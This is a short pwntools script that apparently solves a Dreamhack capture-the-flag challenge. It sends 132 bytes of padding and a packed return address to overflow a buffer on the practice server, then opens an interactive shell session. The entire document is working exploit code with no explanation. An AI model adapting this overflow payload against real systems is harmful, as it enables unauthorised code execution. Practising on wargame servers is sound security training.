from pwn import *

p = remote("host1.dreamhack.games", 22597)

pay = "\x90"*132
pay += p32(0x080485b9)

p.sendline(pay)
p.interactive()